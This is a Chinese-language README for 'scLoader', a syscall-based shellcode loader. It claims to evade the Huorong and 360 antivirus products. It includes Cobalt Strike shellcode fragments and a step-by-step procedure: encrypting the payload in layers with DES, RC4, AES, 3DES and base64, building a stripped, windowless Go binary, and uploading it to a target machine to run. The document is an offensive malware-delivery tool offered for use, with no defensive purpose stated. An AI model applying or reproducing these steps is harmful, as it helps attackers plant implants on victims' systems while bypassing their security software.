# scLoader: shellcode 加载器

## 效果
目前测试动态可以过火绒和360，静态VT检查效果一般

## 特点
- 基于Syscall进行免杀shellcode加载
- 加密方式可以自己选择

## 支持shellcode格式
目前支持CS中C语言格式和Raw格式的shellcode

**C语言字符串格式shellcode**
```
\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48
```

**纯十六进制格式的shellcodes**
```
fc48 83e4 f0e8 c800 0000 4151 4150 5251
5648 31d2 6548 8b52 6048 8b52 1848 8b52
2048 8b72 5048 0fb7 4a4a 4d31 c948 31c0
ac3c 617c 022c 2041 c1c9 0d41 01c1 e2ed
```

## 使用

1、使用sparrow.exe加密shellcode
将CS生成的.bin文件或.c文件放在sparrow.exe同一目录，使用命令

```
.\sparrow.exe -e des,rc4,aes,3des,base64 -f .\payload.bin 
```
***注意：-e参数必须使用base64编码结尾***

2、将加密的shellcode复制到loader.go中的shellcode参数

3、按照加密顺序调整loader.go中的解密顺序，如这里base64,3des,aes,rc4,des

4、编译loader.go文件
```
go build -trimpath -ldflags="-w -s -H=windowsgui" loader.go
```

5、上传到目标机器，使用`loader.exe -fuck`命令加载shellcode


